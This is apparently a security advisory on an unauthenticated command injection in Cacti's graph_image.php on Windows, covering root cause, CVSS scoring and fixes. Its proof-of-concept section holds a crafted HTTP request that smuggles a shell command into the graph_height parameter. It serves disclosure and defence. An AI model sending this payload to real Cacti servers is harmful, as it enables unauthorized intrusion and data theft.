### `Vulnerability Report:` Unauthenticated RCE on Graph Image

> **Researcher:** K &nbsp;|&nbsp; **Product:** Cacti `≤ 1.2.30` (Windows)

</div>

---

## `[01]` Vulnerability Summary

| Field | Value |
|---|---|
| **Product** | Cacti — The Complete RRDtool-based Graphing Solution |
| **Affected Version(s)** | `≤ 1.2.30` |
| **Vulnerability Class** | CWE-78: OS Command Injection |
| **Attack Vector** | Network |
| **Authentication** | **None required** (guest account enabled — common default) |
| **User Interaction** | None |
| **CVSSv3.1 Score** | `9.8 — CRITICAL` |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

Cacti version 1.2.30 and all prior versions are vulnerable to an **unauthenticated Remote Code Execution (RCE)** through an OS command injection vulnerability in `graph_image.php`. The vulnerability stems from a platform-specific failure in the custom Windows shell escaping function `cacti_escapeshellarg()` defined in `lib/functions.php`.

On Windows systems, `cacti_escapeshellarg()` attempts to escape double-quote characters using the backslash sequence `\"`. However, `cmd.exe` — the Windows command interpreter — does **NOT** treat `\"` as an escape sequence for double quotes. This causes the quoting mechanism to fail silently, allowing an attacker to inject arbitrary OS commands via crafted HTTP request parameters.

Because `graph_image.php` unconditionally sets `$guest_account = true`, which bypasses Cacti's authentication layer, **no credentials are required** to trigger this vulnerability from a remote network location.

---

## `[02]` Affected Components

| File | Lines | Role in Vulnerability |
|---|---|---|
| `graph_image.php` | 28, 97–104 | Entry point; auth bypass via `$guest_account = true`; passes unsanitized values to RRD pipeline |
| `lib/functions.php` | 4558–4601 | Defines `cacti_escapeshellarg()` — root cause of broken escaping on Windows |
| `include/global_constants.php` | 27 | Defines `CACTI_ESCAPE_CHARACTER = '"'` (double-quote), the character that fails to escape |
| `lib/rrd.php` | 1125–1210, 264–329 | `rrd_function_process_graph_options()` builds RRDtool shell command; `__rrd_execute()` spawns it via `proc_open()` |
| `include/auth.php` | 124–140 | Implements the guest account bypass that makes this unauthenticated |

---

## `[03]` Root Cause Analysis

### 3.1 Platform-Specific Shell Escaping Failure

The core vulnerability resides in `lib/functions.php` within the `cacti_escapeshellarg()` function (lines 4558–4601):

```php
function cacti_escapeshellarg($string, $quote = true) {
    global $config;
    if ($string == '') { return $string; }
    // Removes only newlines — shell special chars are NOT removed
    $string = str_replace(array("\n", "\r"), array('', ''), $string);
    if ($config['cacti_server_os'] == 'unix') {
        // SAFE: uses single-quote wrapping on Linux
        return escapeshellarg($string);
    } else {
        // WINDOWS — VULNERABLE
        if (substr_count($string, CACTI_ESCAPE_CHARACTER)) {
            $string = str_replace('"', '\\"', $string); // \" does NOT escape in cmd.exe
        }
        if ($quote) { return '"' . $string . '"'; }
    }
}
```

### 3.2 Why `\"` Fails in `cmd.exe`

On Linux/Unix, `escapeshellarg()` wraps strings in **single quotes**, which in bash prevents all shell special characters from being interpreted — this is complete protection.

On Windows, Cacti wraps in **double quotes** and attempts to escape internal double quotes with backslash (`\"`): this is incorrect because:

- In `cmd.exe`, the **caret** (`^`) is the escape character, not backslash.
- `cmd.exe` interprets `\"` as a literal backslash followed by a **string-terminating** double quote.
- The double-quote is effectively closed by the backslash sequence, allowing characters after it (such as `&`) to be interpreted as shell metacharacters.

### 3.3 Authentication Bypass via `$guest_account`

**`graph_image.php`, line 28:**

```php
$guest_account = true; // Set BEFORE including auth.php
$auth_text = true;
include('./include/auth.php');
```

**`include/auth.php`, lines 124–140:**

```php
if (isset($guest_account)) {
    $guest_user_id = get_guest_account();
    if (!empty($guest_user_id)) {
        $_SESSION['sess_user_id'] = $guest_user_id;
        return true; // <-- returns TRUE without ANY credential check
    }
}
```

When the Guest account is enabled (a common default deployment), this flag causes `auth.php` to immediately return `true` with zero credential validation — making the vulnerability exploitable by an **unauthenticated attacker**.

### 3.4 Command Execution via `proc_open()`

**`lib/rrd.php`, lines 321–326:**

```php
$process = proc_open(
    read_config_option('path_rrdtool') . ' - ' . $debug,
    $descriptorspec,
    $pipes
);
// Constructed command line (with attacker payload) written to RRDtool stdin
fwrite($pipes[0], escape_command($command_line) . "\r\nquit\r\n");
```

The `$command_line` string — built by `rrd_function_process_graph_options()` using parameters processed through broken `cacti_escapeshellarg()` on Windows — is passed to an RRDtool subprocess. Because RRDtool parses its command arguments through the Windows shell, the injected commands execute in that context.

---

## `[04]` Prerequisites

| Condition | Likelihood | Notes |
|---|---|---|
| Cacti runs on Windows | Common in enterprise | Vulnerability is Windows-specific due to `cmd.exe` behavior |
| Guest account enabled | Common — often default | Cacti's Guest user allows public graph viewing; enabled in many standard deployments |
| At least one graph exists | Near universal | `local_graph_id=1` is present after fresh install with sample data |
| RRDtool installed | Required by Cacti | Without RRDtool, Cacti cannot function; always present |

> **Note:** If guest access is disabled, an authenticated variant still exists — any low-privilege Cacti user with graph viewing access can trigger the same payload.

---

## `[05]` Proof of Concept

### 5.1 Payload Construction

The attacker sends a crafted HTTP GET request to `graph_image.php`:

```
GET /cacti/graph_image.php?local_graph_id=1&graph_height=100" & {CMD} & "&action=view
```

**Payload breakdown:**
- Attacker input: `100" & whoami & "`
- After `cacti_escapeshellarg()`: `"100\" & whoami & \""`
- As interpreted by `cmd.exe`: `"100\"` → closes string; `&` → separator; `whoami` → executes

---

## `[06]` Impact Assessment

| Pillar | Rating | Description |
|---|---|---|
|  **Confidentiality** | HIGH | Full read access to any file accessible by the web server process (IIS / Apache running PHP), including Cacti `include/config.php` (database credentials), Windows SAM database (if running as SYSTEM), and any application secrets co-located on the server |
|  **Integrity** | HIGH | Arbitrary command execution with web server process privileges allows modification or deletion of any file, web shell deployment for persistent backdoor access, and lateral movement to connected databases and network resources |
|  **Availability** | HIGH | An attacker can terminate processes, corrupt RRD data files, or exhaust system resources, causing complete denial of service for the Cacti monitoring infrastructure |
---

## `[07]` CVSS v3.1 Scoring

| Metric | Value | Justification |
|---|---|---|
| **Attack Vector (AV)** | Network (N) | Exploitable over HTTP with no physical access |
| **Attack Complexity (AC)** | Low (L) | No race conditions, no special timing required |
| **Privileges Required (PR)** | None (N) | Guest account bypasses all authentication |
| **User Interaction (UI)** | None (N) | Fully automated — victim action not required |
| **Scope (S)** | Unchanged (U) | Operates within web server process scope |
| **Confidentiality (C)** | High (H) | Full read access to web server filesystem |
| **Integrity (I)** | High (H) | Full write access; arbitrary command execution |
| **Availability (A)** | High (H) | Full denial of service possible |

> **Base Score: `9.8 — CRITICAL`**  
> **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

## `[08]` Remediation Recommendations

| Priority | Action |
|---|---|
| Immediate | Fix `cacti_escapeshellarg()` on Windows — replace `\"` with `^"` (caret is `cmd.exe` escape char), or use `proc_open` with `bypass_shell: true` to avoid shell parsing entirely |
| Short-term | Disable Guest Account if public graph viewing is not required: `Console → Configuration → Settings → Authentication → Guest User → --None--` |
| Long-term | Replace all `proc_open` string commands with array invocation. Audit all uses of `cacti_escapeshellarg()` across `lib/snmp.php`, `lib/rrd.php` and other files. Add Windows-specific CI/CD pipeline tests with adversarial input |

---
